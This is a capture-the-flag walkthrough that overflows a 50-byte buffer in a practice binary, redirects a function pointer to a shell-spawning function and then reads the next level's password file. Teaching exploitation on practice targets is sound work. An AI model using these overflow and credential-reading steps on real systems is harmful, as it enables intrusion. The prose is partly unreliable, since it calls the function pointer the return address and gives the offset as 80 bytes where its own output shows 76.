1. Start out by looking at the source code in level03.c
```
//bla, based on work by beach
 
#include <stdio.h>
#include <string.h>
 
void good()
{
    puts("Win.");
    execl("/bin/sh", "sh", NULL);
}
void bad()
{
    printf("I'm so sorry, you're at %p and you want to be at %p\n", bad,     good);
}
 
int main(int argc, char **argv, char **envp)
{
    void (*functionpointer)(void) = bad;
    char buffer[50];

    if(argc != 2 || strlen(argv[1]) < 4)
        return 0;

    memcpy(buffer, argv[1], strlen(argv[1]));
    memset(buffer, 0, strlen(argv[1]) - 4);

    printf("This is exciting we're going to %p\n", functionpointer);
    functionpointer();

    return 0;
}
```

2. At first glance, we see two functions: good() and bad(). We see they're kind enough to tell us the address of good(), and it seems like we need redirect execution to go there. We need to supply at least one command line argument that's longer than four characters, then it gets mem copied in its entirety into a fixed size buffer of 50 bytes. We need to supply a string long enough to overwrite the return address at the end of the function. To make it easy we can use python to print out a string and figure out how many bytes we need.
```
level3@io:/levels$ ./level03 $(python -c 'print "A"*100')
This is exciting we're going to (nil)
Segmentation fault
```
Oops, that's too long. Let's try to shorten it a bit.
```
level3@io:/levels$ ./level03 $(python -c 'print "A"*80')
This is exciting we're going to 0x41414141
Segmentation fault
```
Perfect, looks like 80 bytes is enough overwrite the return address. Let's try to shorten it a bit and see exactly where we overwrite it.
```
level3@io:/levels$ ./level03 $(python -c 'print "A"*76')
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```
Looks like the magic number was 80 bytes! Let's double check to make sure we're right.
```
level3@io:/levels$ ./level03 $(python -c 'print "A"*76 + "BBBB"')
This is exciting we're going to 0x42424242
Segmentation fault
```

3. Now that we know how many bytes we need, we need to replace the Bs with the four bytes of the address for the function good() we can return into it. The address is 0x8048474. Because x86 architecture is little endian, we need to reverse the bytes in the memory address in order to actually jump to 0x8048474.
```
level3@io:/levels$ ./level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.2$ cat /home/level4/.pass
[The password for level4]
```
